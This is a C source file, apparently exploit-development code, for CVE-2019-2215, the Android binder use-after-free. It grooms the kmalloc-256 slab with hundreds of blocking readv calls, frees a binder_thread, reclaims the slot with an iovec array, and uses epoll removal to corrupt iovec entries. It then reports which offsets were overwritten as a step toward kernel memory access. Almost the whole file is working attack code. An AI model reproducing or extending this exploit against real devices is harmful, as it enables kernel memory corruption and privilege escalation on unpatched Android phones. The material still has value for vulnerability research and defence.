/*
 * binder_uaf_k256.c — CVE-2019-2215 exploit targeting kmalloc-256
 *
 * Key findings:
 * - binder_thread is in kmalloc-256 (not 512!)
 * - Need 32 iovecs (32 * 8 = 256 bytes) for readv reclaim
 * - wait_queue_head_t estimated at offset 44 in binder_thread
 *   (lock at 44, task_list.next at 48, task_list.prev at 52)
 *
 * Approach:
 * 1. Exhaust kmalloc-256 free list on same CPU
 * 2. Free binder_thread (THREAD_EXIT)
 * 3. Immediately readv with 32 iovecs → reclaim freed slot
 * 4. Worker: epoll_ctl DEL → list_del modifies iov entries
 * 5. Worker: write to pipe → readv completes
 * 6. Check which iov entries got corrupted
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/syscall.h>
#include <unistd.h>

#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)

#define IOVCNT       32     /* 32 * 8 = 256 bytes → kmalloc-256 */
#define BUF_PER_IOV  32     /* bytes per user buffer */
#define CANARY       0xDEADBEEF

/* Exhaust pipes: each blocking readv holds a 256-byte kmalloc allocation */
#define EXHAUST_COUNT 500

struct exhaust_data {
    int pipe_rd;
    struct iovec iov[1];
    uint8_t buf[8];
    volatile int started;
};

static void *exhaust_readv(void *arg) {
    struct exhaust_data *e = (struct exhaust_data *)arg;
    /* Pin to CPU 0 */
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
    e->started = 1;
    readv(e->pipe_rd, e->iov, IOVCNT);
    return NULL;
}

struct worker_args {
    int epfd;
    int binder_fd;
    int pipe_wr;
    volatile int go;
    volatile int del_done;
};

static void *worker(void *arg) {
    struct worker_args *w = (struct worker_args *)arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    while (!w->go) usleep(100);
    usleep(30000); /* 30ms for readv to reclaim */

    struct epoll_event ev = { .events = EPOLLIN };
    printf("  [W] epoll_ctl DEL...\n");
    epoll_ctl(w->epfd, EPOLL_CTL_DEL, w->binder_fd, &ev);
    w->del_done = 1;

    usleep(5000);

    /* Write data to unblock readv */
    uint8_t data[IOVCNT * BUF_PER_IOV + 256];
    for (int i = 0; i < IOVCNT; i++)
        memset(data + i * BUF_PER_IOV, (uint8_t)(i + 1), BUF_PER_IOV);
    memset(data + IOVCNT * BUF_PER_IOV, 0xFF, 256);

    int total = IOVCNT * BUF_PER_IOV;
    int written = 0;
    while (written < total) {
        int w2 = write(w->pipe_wr, data + written, total - written);
        if (w2 <= 0) break;
        written += w2;
    }
    printf("  [W] Wrote %d bytes to pipe\n", written);
    return NULL;
}

static void read_slab_count(const char *cache, int *active) {
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[512];
    *active = -1;
    if (!f) return;
    while (fgets(line, sizeof(line), f)) {
        char name[64]; int a;
        if (sscanf(line, "%63s %d", name, &a) == 2 && !strcmp(name, cache)) {
            *active = a;
            break;
        }
    }
    fclose(f);
}

static int run_attempt(int attempt_num) {
    printf("\n=== Attempt %d ===\n", attempt_num);

    /* Pin to CPU 0 */
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    int before_active;
    read_slab_count("kmalloc-256", &before_active);
    printf("  kmalloc-256 baseline: %d\n", before_active);

    /* Phase 1: Exhaust kmalloc-256 on CPU 0 */
    printf("  Exhausting kmalloc-256 (%d blocking readvs)...\n", EXHAUST_COUNT);
    int epipes[EXHAUST_COUNT][2];
    pthread_t etids[EXHAUST_COUNT];
    struct exhaust_data *edata = calloc(EXHAUST_COUNT, sizeof(struct exhaust_data));
    int exhausted = 0;

    for (int i = 0; i < EXHAUST_COUNT; i++) {
        if (pipe(epipes[i]) < 0) break;
        edata[i].pipe_rd = epipes[i][0];
        /* Important: use IOVCNT iovecs so alloc is 256 bytes */
        edata[i].iov[0].iov_base = edata[i].buf;
        edata[i].iov[0].iov_len = 1;
        edata[i].started = 0;
        pthread_create(&etids[i], NULL, exhaust_readv, &edata[i]);
        while (!edata[i].started) usleep(10);
        exhausted++;
    }
    usleep(100000);

    int after_exhaust;
    read_slab_count("kmalloc-256", &after_exhaust);
    printf("  kmalloc-256 after exhaust: %d (+%d)\n",
           after_exhaust, after_exhaust - before_active);

    /* Phase 2: Open binder + epoll */
    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("binder"); return -1; }
    mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    uint32_t z = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &z);

    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev);

    int after_binder;
    read_slab_count("kmalloc-256", &after_binder);
    printf("  kmalloc-256 after binder+epoll: %d (+%d from exhaust)\n",
           after_binder, after_binder - after_exhaust);

    /* Phase 3: Prepare readv buffers */
    uint8_t *bufs[IOVCNT];
    struct iovec iov[IOVCNT];
    for (int i = 0; i < IOVCNT; i++) {
        bufs[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memset(bufs[i], 0xCC, 4096);
        *(uint32_t *)bufs[i] = CANARY;
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = BUF_PER_IOV;
    }

    int pfd[2];
    pipe(pfd);

    /* Phase 4: Start worker (will trigger DEL + pipe write after readv blocks) */
    struct worker_args wargs = {
        .epfd = epfd, .binder_fd = binder_fd,
        .pipe_wr = pfd[1], .go = 0, .del_done = 0
    };
    pthread_t wtid;
    pthread_create(&wtid, NULL, worker, &wargs);

    /* Phase 5: FREE binder_thread and IMMEDIATELY readv */
    printf("  THREAD_EXIT + readv (same thread, CPU 0)...\n");
    int32_t dummy = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, &dummy);
    wargs.go = 1;

    /* readv blocks on empty pipe; kmalloc(256) for iov array reclaims freed thread */
    ssize_t ret = readv(pfd[0], iov, IOVCNT);
    int err = errno;
    printf("  readv: %zd (errno=%d)\n", ret, err);

    /* Phase 6: Analyze */
    int first_bad = -1;
    int efault = (ret == -1 && err == EFAULT);

    if (efault) {
        printf("\n  !!! EFAULT — iov_base was corrupted to kernel addr !!!\n");
        /* Find which entries got data */
        for (int i = 0; i < IOVCNT; i++) {
            if (*(uint32_t *)bufs[i] != CANARY) {
                if (bufs[i][0] != (uint8_t)(i + 1) && first_bad == -1)
                    first_bad = i;
            } else {
                if (first_bad == -1) first_bad = i;
            }
        }
    } else if (ret > 0) {
        for (int i = 0; i < IOVCNT; i++) {
            if (bufs[i][0] != (uint8_t)(i + 1)) {
                first_bad = i;
                break;
            }
        }
    }

    printf("  First bad entry: %d (EFAULT=%d)\n", first_bad, efault);

    /* Dump all entries */
    printf("\n  Entry status (. = OK, X = untouched, ! = corrupted, E = EFAULT skip):\n  ");
    for (int i = 0; i < IOVCNT; i++) {
        uint32_t w = *(uint32_t *)bufs[i];
        if (bufs[i][0] == (uint8_t)(i + 1)) printf(".");
        else if (w == CANARY) printf("X");
        else printf("!");
    }
    printf("\n");

    if (first_bad >= 0) {
        printf("\n  *** CORRUPTION at iov[%d] (byte offset %d) ***\n",
               first_bad, first_bad * 8);
        int s = (first_bad > 2) ? first_bad - 2 : 0;
        int e = (first_bad + 4 < IOVCNT) ? first_bad + 4 : IOVCNT;
        for (int i = s; i < e; i++) {
            printf("  iov[%2d] off=%3d: ", i, i * 8);
            for (int j = 0; j < 16; j++) printf("%02x ", bufs[i][j]);
            printf("%s\n",
                   (bufs[i][0] == (uint8_t)(i+1)) ? " OK" :
                   (*(uint32_t*)bufs[i] == CANARY) ? " CANARY" : " CORRUPT");
        }
    }

    /* Cleanup: release exhaust threads */
    for (int i = 0; i < exhausted; i++) close(epipes[i][1]);
    usleep(200000);
    for (int i = 0; i < exhausted; i++) {
        pthread_join(etids[i], NULL);
        close(epipes[i][0]);
    }
    free(edata);

    pthread_join(wtid, NULL);
    close(binder_fd); close(epfd);
    close(pfd[0]); close(pfd[1]);
    for (int i = 0; i < IOVCNT; i++) munmap(bufs[i], 4096);

    return first_bad;
}

int main(void) {
    printf("=== CVE-2019-2215 kmalloc-256 Exploit ===\n");
    printf("PID=%d UID=%d CPUs=%ld\n", getpid(), getuid(),
           sysconf(_SC_NPROCESSORS_ONLN));

    for (int i = 0; i < 5; i++) {
        int result = run_attempt(i);
        if (result >= 0) {
            printf("\n*** GOT CORRUPTION at offset %d on attempt %d ***\n",
                   result * 8, i);
            printf("*** wait_queue_head likely at offset %d or %d ***\n",
                   result * 8 - 4, result * 8);
            break;
        }
    }

    printf("\n--- dmesg ---\n"); fflush(stdout);
    system("dmesg 2>/dev/null | tail -20 | grep -iE 'oops|bug|panic|fault|binder|list|corrupt|Backtrace|Unable|PC.is' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
